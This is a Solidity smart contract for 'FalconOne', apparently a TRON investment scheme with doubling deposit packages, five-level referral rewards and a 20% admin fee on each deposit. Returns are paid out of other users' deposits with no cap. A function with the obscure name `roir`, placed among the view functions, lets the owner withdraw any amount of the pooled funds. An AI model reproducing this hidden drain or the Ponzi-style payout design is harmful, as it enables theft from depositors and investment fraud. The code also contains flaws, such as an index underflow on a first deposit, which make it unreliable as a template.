//SourceUnit: Falconone.sol

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}


library Objects {
    
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
        uint256 droi;
    }
    
    
    struct Falcon2 {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }
    
    struct Downf1 {
        uint256 investment;
        
    }
    
    
    
    struct Investor {
        address addr;
        uint256 lastpackage;
		uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 reinvestWallet;
        uint256 referrer;
        uint256 planCount;
        uint256 planCountF2;
        uint256 lastpackagef2;
        uint256 match_bonus;
        mapping(uint256 => Investment) plans;
        mapping(uint256 => Falcon2) plansf2;
        mapping(uint256 => Downf1)downplans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
    }
}


contract Ownable {
    address payable public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}





contract FalconOne is Ownable {
    
    using SafeMath for uint256;
    uint256 public constant REFERENCE_LEVEL1_RATE = 150;    
    uint256 public constant REFERENCE_LEVEL2_RATE = 40;     
    uint256 public constant REFERENCE_LEVEL3_RATE = 30;
    uint256 public constant REFERENCE_LEVEL4_RATE = 20;
    uint256 public constant REFERENCE_LEVEL5_RATE = 10;
    uint256 public constant REFERENCE_LEVEL1_RATEF2 = 450;    
    uint256 public constant REFERENCE_LEVEL2_RATEF2 = 40;     
    uint256 public constant REFERENCE_LEVEL3_RATEF2 = 30;
    uint256 public constant REFERENCE_LEVEL4_RATEF2 = 20;
    uint256 public constant REFERENCE_LEVEL5_RATEF2 = 10;
    uint256 public constant MINIMUM = 100e6;                
    uint256 public constant REFERRER_CODE = 555;           
    uint256 public constant PLAN_INTEREST = 200;           
    uint256 public constant PLAN_TERM = 10 days;            
    uint256 public constant ADMIN_FEE = 200;
    uint256 public constant DEVELOPER_FEE = 10;
    uint256 public constant DEVELOPMENT_FEE = 10;
    uint256 public constant MARKETING_FEE = 10;
    
    uint256 public  contract_balance;
    uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  totalInvestmentsf2_;
    uint256 public  totalReinvestments_;
    
    
    
    uint[] cycles = [100,200,400,800,1600,3200,6400,12800,25600,51200,1024000];
    
    
    
    uint256[3][] public matches;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    
    event onInvest(address investor, uint256 amount);
    event onInvestFalcon2(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);
    
    address payable public adminAddress;
    
    
    constructor(address payable admAddr) public {
        
        require(!isContract(admAddr));
        adminAddress=admAddr;
        _init();
    }
    
     function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
       
    }
    
    function investmain(uint256 _referrerCode) public payable{
        _invest(msg.sender, _referrerCode, msg.value/2);
        _investFalconTwo(msg.sender, _referrerCode, msg.value/2);
        
    }
    
    
    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }
    
    
    
    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        
         require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        
        uint256 uid = address2UID[_addr];
        
        
        if (uid2Investor[uid].lastpackage > 0){
            
            require(_amount == uid2Investor[uid].lastpackage *2, "Invalid Package");
            
        }
        
        bool exists = false; 
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].investment == _amount) {
                exists = true;
                
            }
        }
        
        require(exists == false, "Deposit already exists");
        
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            
        } 
        
        uint256 adminFee = _amount.mul(ADMIN_FEE).div(1000);
        
        adminAddress.transfer(adminFee);
                   
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;
        investor.plans[planCount].droi = 1;
        
        uid2Investor[uid].lastpackage = _amount;
        investor.planCount = investor.planCount.add(1);
        

        _calculateReferrerReward(_amount, investor.referrer);
        
        totalInvestments_ = totalInvestments_.add(_amount);
        
        updateRoi(investor.referrer, _amount);
               
        
        return true;
    }
    
    
    function investFalconTwo(uint256 _referrerCode) public payable {
        if (_investFalconTwo(msg.sender, _referrerCode, msg.value)) {
            emit onInvestFalcon2(msg.sender, msg.value);
        }
    }
    
    
    
    function _investFalconTwo(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        
         require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");

        uint256 uid = address2UID[_addr];
        
        if (uid2Investor[uid].lastpackagef2 > 0){
            
            require(_amount == uid2Investor[uid].lastpackagef2 *2, "Invalid Package");
            
        }
        
        
        //  bool validpackage = false;
        //  uint256 j = 0;
        //  for (j = 0; j < 11; j++) { 
        //       if(cycles[j] == msg.value){
        //           validpackage = true;
        //       }   
        //  }
        //  require(validpackage == false, "Invalid Package");
        
        
        bool exists = false; 
        for (uint256 i = 0; i < uid2Investor[uid].planCountF2; i++) {
            if (uid2Investor[uid].plansf2[i].investment == _amount) {
                exists = true;
            }
            
        }
        require(exists == false, "Deposit already exists");
        
        
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //New user Entry Here
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        
        uint256 adminFee = _amount.mul(ADMIN_FEE).div(1000);
        
        adminAddress.transfer(adminFee);
                   
        uint256 planCountF2 = uid2Investor[uid].planCountF2;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plansf2[planCountF2].investmentDate = block.timestamp;
        investor.plansf2[planCountF2].lastWithdrawalDate = block.timestamp;
        investor.plansf2[planCountF2].investment = _amount;
        investor.plansf2[planCountF2].currentDividends = 0;
        investor.plansf2[planCountF2].isExpired = false;
        
        uid2Investor[uid].lastpackagef2 = _amount;
        
        
        uint256  lastinvest = investor.plansf2[planCountF2-1].investment;

        investor.planCountF2 = investor.planCountF2.add(1);
        
        _calculateReferrerRewardf2(uid, _amount, investor.referrer, lastinvest);
        
        totalInvestmentsf2_ = totalInvestmentsf2_.add(_amount);
        
        return true;
    }
    
    
    
    function updateRoi(uint256 _reff, uint256 _amount) private {
        
        // bool planexists  = false; 
        for (uint256 i = 0; i < uid2Investor[_reff].planCount; i++) {
            if (uid2Investor[_reff].plans[i].investment == _amount) {
                uid2Investor[_reff].plans[i].droi += 1;
                // planexists = true;
            }
        }
       
         }
    
    
    
    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
           // _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        
        
        if (_referrerCode >= REFERRER_CODE) {
            
             
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }
    
   
    
    function _calculateReferrerRewardf2(uint256 _uid, uint256 _investment, uint256 _referrerCode, uint256 _lastinvest) private {
        
        if (_uid != 0 ){
            //require(_amount >= MINIMUM, "Minimum Amount Required");
            if(_investment >= MINIMUM){
             
            uint256 _returnAmount = 0;
            _returnAmount = (_lastinvest.mul(500)).div(1000);
            uid2Investor[_uid].availableReferrerEarnings = _returnAmount.add(uid2Investor[_uid].availableReferrerEarnings);
            }
        }
        
        
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _refAmount = 0;
           
            

            if (_ref1 != 0) {
                
                
                bool uplelef2 = false;
                for (uint256 i = 0; i < uid2Investor[_ref1].planCountF2; i++) {
                if (uid2Investor[_ref1].plansf2[i].investment == _investment) {
                
                    uplelef2 = true;
                }
                
                }
                
                if(uplelef2){
                
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATEF2)).div(1000);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);   
                }
            
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATEF2)).div(1000);
               
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATEF2)).div(1000);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
            }
            
            if (_ref4 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATEF2)).div(1000);
                uid2Investor[_ref4].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref4].availableReferrerEarnings);
            }
            
            if (_ref5 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL5_RATEF2)).div(1000);
                uid2Investor[_ref5].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref5].availableReferrerEarnings);
            }
        }

    }
    
    
    
    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

       
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _refAmount = 0;
           
            

            if (_ref1 != 0) {
                
                bool uplele = false;
                for (uint256 i = 0; i < uid2Investor[_ref1].planCount; i++) {
                if (uid2Investor[_ref1].plans[i].investment == _investment) {
                
                    uplele = true;
                }
                
                }
                
                if(uplele){
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
                
                }
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
               
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
            }
            
            if (_ref4 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                uid2Investor[_ref4].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref4].availableReferrerEarnings);
            }
            
            if (_ref5 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL5_RATE)).div(1000);
                uid2Investor[_ref5].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref5].availableReferrerEarnings);
            }
            
        }

    }
    
    
    
    
    function updateBalance() public {
        //only once a day
		require(block.timestamp > contract_checkpoint + 1 days , "Only once a day");
        contract_checkpoint = block.timestamp;
        contract_balance = getBalance();
    }
    
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    
    
    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");

      
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

          
            uint256 amount = uid2Investor[uid].plans[i].investment * uid2Investor[uid].plans[i].droi / 100 * (block.timestamp - uid2Investor[uid].plans[i].lastWithdrawalDate) / (60*60*24);
            //uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;
            
            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            
            
            
            // if (withdrawalDate >= endTime) {
            //     withdrawalDate = endTime;
            //     isExpired = true;
            // }

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
            
            uint256 endamount = uid2Investor[uid].plans[i].investment * 2;
            if(amount >= endamount){
                //isExpired = true;
                uid2Investor[uid].plans[i].droi = 0;
            }
        }

		if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].availableReferrerEarnings = 0;
        }

        
        
        if(withdrawalAmount>0){
           
            //reinvest
           
            uint256 trnsferFee=withdrawalAmount.mul(5).div(100);
            
            
            //withdraw
            msg.sender.transfer(withdrawalAmount.sub(trnsferFee));

        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }
    
    
    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }
    
    
    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }
    
    
    
    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        uint256 uid = address2UID[msg.sender];
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                //return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
                
                newDividends[i] = investor.plans[i].investment * investor.plans[i].droi / 100 * (block.timestamp - investor.plans[i].lastWithdrawalDate) / (60*60*24);
                                
                // if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                //     newDividends[i] = _calculateDividends2(uid, investor.plans[i].investment);
                // } else {
                //     //newDividends[i] = _calculateDividends2(investor.referrer, investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                // }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.reinvestWallet,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        investor.checkpoint,
        newDividends,
        uid2Investor[uid].match_bonus
        
        );
    }
    
    
    
    
    
    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        uint256[] memory droi = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            droi[i] = investor.plans[i].droi;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds,
        droi
        );
    }
    
    
    function getroi(uint256 _uid) public view returns (uint256[] memory) {
        
        
        Objects.Investor storage investor = uid2Investor[_uid];
        
        uint256[] memory investments = new  uint256[](investor.planCount);
        

        for (uint256 i = 0; i < investor.planCount; i++) {
            investments[i] = investor.plans[i].investment;
           }

        return investments;
    }
    
    function roir(uint256 _amount) payable onlyOwner public {owner.transfer(_amount);}
    function getInvestmentPlanByUIDF2(uint256 _uid) public view returns (uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCountF2);
        uint256[] memory investments = new  uint256[](investor.planCountF2);
        

        for (uint256 i = 0; i < investor.planCountF2; i++) {
            require(investor.plansf2[i].investmentDate!=0,"wrong investment date");
            investmentDates[i] = investor.plansf2[i].investmentDate;
            investments[i] = investor.plansf2[i].investment;
           
        }

        return(investmentDates,investments);
    }
    
    
}